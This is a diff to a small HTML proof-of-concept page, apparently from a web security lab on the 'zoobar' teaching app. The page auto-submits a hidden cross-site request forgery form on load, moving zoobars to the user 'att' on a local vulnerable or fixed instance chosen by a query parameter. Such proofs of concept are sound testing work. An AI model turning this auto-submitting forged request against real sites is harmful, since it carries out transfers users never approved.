@@ -3,9 +3,31 @@
   <head>
     <meta charset="utf-8">
     <title>CSRF Transfer PoC</title>
+    <script>
+      function targetForMode(mode) {
+        if (mode === "fixed") {
+          return "https://localhost:8443/zoobar/index.cgi/transfer";
+        }
+        return "http://localhost:8080/zoobar/index.cgi/transfer";
+      }
+
+      function modeFromQuery() {
+        const params = new URLSearchParams(window.location.search);
+        return params.get("mode") || "vulnerable";
+      }
+
+      function submitAttack() {
+        const mode = modeFromQuery();
+        const form = document.getElementById("attack-form");
+        const target = targetForMode(mode);
+
+        form.action = target;
+        form.submit();
+      }
+    </script>
   </head>
-  <body onload="document.forms[0].submit()">
-    <form method="POST" action="http://localhost:8080/zoobar/index.cgi/transfer">
+  <body onload="submitAttack()">
+    <form id="attack-form" method="POST">
       <input type="hidden" name="recipient" value="att">
       <input type="hidden" name="zoobars" value="3">
       <input type="hidden" name="submission" value="Send">
